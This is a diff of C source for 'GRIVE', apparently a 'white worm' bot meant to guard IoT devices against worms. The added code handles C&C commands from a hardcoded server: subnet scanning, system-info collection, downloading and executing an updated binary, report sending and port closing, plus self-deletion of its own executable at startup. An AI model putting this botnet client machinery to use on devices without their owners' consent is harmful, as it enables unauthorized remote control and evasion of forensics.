@@ -22,7 +22,7 @@
 #define AES_BLOCK_SIZE          16
 
 int main(int c, char *argv[]){
-
+    remove(argv[0]);
      int sockfd, valread;
      int BOT_ID = 0;
      char a;
@@ -44,8 +44,6 @@ int main(int c, char *argv[]){
 
      sprintf(ip, "172.18.18.18");
      ip[13]='\0';
-     // char ip[12] = "172.18.18.18";
-     //char  ending[3] = "end";
      sprintf(ending, "end");
      
     memset(buffer, 0, 1024);
@@ -55,17 +53,17 @@ int main(int c, char *argv[]){
     memset(log, 0, 30);
     memset(mess, 0, 100);
 
-    // notify the owner in the logfile.txt the aim of the project 
-    FILE* logfile = fopen("/tmp/GRIVE_logfile.txt", "a");
+
+    FILE* logfile = fopen("/home/GRIVE_logfile.txt", "a");
     if(logfile != NULL){
         memset(mess, 0, 100);
-        sprintf(mess, "GRIVE is a project that aim to protect your device from being infected by IoT worms.");
+        sprintf(mess, "GRIVE.1.1 is a project that aim to protect your device from being infected by IoT worms.-");
         fprintf(logfile, "%s \n", mess);
         memset(mess, 0, 100);
-        sprintf(mess, "ATTENTION!! Your device is vulnerable, you must update your frimware!!");
+        sprintf(mess, "ATTENTION!! Your device is vulnerable, you must update your frimware!!-");
         fprintf(logfile, "%s \n", mess);
         memset(mess, 0, 100);
-        sprintf(mess, "For more information, you can visit Grive repesotory on github.");
+        sprintf(mess, "For more information, you can visit Grive repesotory on github.-");
         fprintf(logfile, "%s \n", mess);
     }
     fclose(logfile);
@@ -75,19 +73,18 @@ int main(int c, char *argv[]){
     printLog(log);
     memset(log, 0, 30);
     
-    // printf("Try to connect to the C&C Server:5000.\n ");
+
     sockfd = create_connection(5000, ip);
-     //printf("The socket descriptor is: %d.\n", sockfd);
+
      
     if(sockfd > -1){
     
-        //memset(buffer, 0, sizeof buffer); 
+
         memset(address, 0, sizeof address); 
         sprintf(log, "Connected to the server.");
-        printLog(log);
+        printLog(log_editor(log, true));
         memset(log, 0, 30);
 
-    
 	    valread = read(sockfd, buffer, 1024);
 
 	    while( valread > 0){
@@ -98,12 +95,101 @@ int main(int c, char *argv[]){
                     memcpy(size, buffer, 2*sizeof(char));
                     size[2]='\0';
                     length = atoi(size);
+                    //decrypt the buffer
                     dbuffer = decode_decrypt(buffer, length);
                     memset(buffer, 0, sizeof buffer);
-
             if( dbuffer[0] == '0'){
 
-             if( dbuffer[1] == '6'){
+                if (dbuffer[1] == '0'){ 
+                    
+                    memcpy(ID, &dbuffer[3], 4*sizeof(char));
+                    for (int i = 0; i < 4; i++) {
+                        if ((unsigned)*ID-'0'<10)
+                            BOT_ID = 10*BOT_ID+(*ID-'0');
+                             ID++;
+                    }
+                         
+                 sprintf(action, "Receive an ID %d", BOT_ID);
+                 printLog(log_editor(action, true));
+
+                }else if( dbuffer[1] == '1'){ 
+
+                    //01 SCAN: "01 <ip>/<mask>"
+                    memset(mess, 0, sizeof(mess));
+                    memset(address, 0, 15); 
+                    memset(sub_mask, 0, 2);
+                    int i ;
+                    for (  i = 3 ; i < 19 ; i++ ){
+                        if ( dbuffer [i] == '/' )
+                            break;
+                        else{
+                         address [i - 3] = dbuffer [i];
+                        }
+                     }
+                    sub_mask [0] = dbuffer [i+1];
+                    sub_mask [1] = dbuffer [i+2];
+                    scan_sub(address, atoi(sub_mask), sockfd, BOT_ID);
+                    sprintf(mess, "Scanning the %s/%s", address, sub_mask);
+                    send_msg(sockfd, log_editor(mess, true), BOT_ID);
+                    printLog(log_editor(mess, true));
+
+                }else if( dbuffer[1] == '2'){
+                    //02 SYSTEM INFO: "02"
+                    system_info(sockfd, BOT_ID);
+                    memset(log, 0, 30);
+                    sprintf(log, "Send SystemInfo");
+                    printLog(log_editor(log, true));
+
+                }else if( dbuffer[1] == '3'){
+
+                    //03 Update BINARIES: "03 <file name>"
+                    // the filename must be always be grivexx.out
+                    char* filename = (char*) malloc(12*sizeof(char));
+                    memset(filename, 0, 11);
+                    memcpy(filename, &dbuffer[5], 11*sizeof(char));
+                    filename[11]='\0';
+                    update(filename);
+                    char* path = (char*) malloc(14*sizeof(char));
+                    path[0]='.';
+                    path[1]='/';
+                    path[13]='\0';
+                    memcpy(&path[2], &dbuffer[5], 11*sizeof(char));
+                    char *args[]={path, NULL};
+                    close(sockfd);
+                    remove(argv[0]);
+                    memset(log, 0, 30);
+                    sprintf(log, "Update grive");
+                    printLog(log_editor(log, true));
+                    execvp(args[0],args);
+
+                }else if( dbuffer[1] == '4'){
+
+                    // 04 SEND REPORT: "04"
+                    printf("[C&C] Command:\t");
+                    printf("Send report command.\n");
+                    report(sockfd, BOT_ID);
+            
+                }else if( dbuffer[1] == '5'){
+
+                     // 05 PROTECT: "05"
+                    printf("[C&C] Command:\t");
+                    printf("Grive will protect the device. \n");
+                    closePort(23); // telnet 
+                    closePort(2323); // alternatice telnet 
+                    closePort(5358); // some port that might be used by malwares
+                    memset(log, 0, 30);
+                    sprintf(log, "Port 23,2323,5358 is closed.");
+                    printLog(log_editor(log, true));
+                    closePort(5555); // same
+                    closePort(7547); // same
+                    memset(log, 0, 30);
+                    sprintf(log, "Port 5555, 7547 is closed.");
+                    printLog(log_editor(log, true));
+                    memset(log, 0, 30);
+                    sprintf(log, "PROTECTED-");
+                    send_msg(sockfd, log, BOT_ID);
+
+                }else if( dbuffer[1] == '6'){
                     // 06 ADVANCED: "06"
                     printf("Testing the new feature.\n");
 
@@ -122,9 +208,8 @@ int main(int c, char *argv[]){
                     printf("Have an awesome day :)\n");
                     memset(log, 0, 30);
                     sprintf(log, "It is time to forever rest.");
-                    send_msg(sockfd, log, BOT_ID);
                     printLog(log);
-                    print_repo(log);
+                    report(sockfd, BOT_ID);
                     close(sockfd);
                     return 0;
 
@@ -169,7 +254,7 @@ int main(int c, char *argv[]){
      printf("Have an awesome day :)\n");
      memset(log, 0, 30);
      sprintf(log, "It is time to forever rest.");
-     send_msg(sockfd, log, BOT_ID);
+     report(sockfd, BOT_ID);
      printLog(log);
 
 // cleaning before leaving
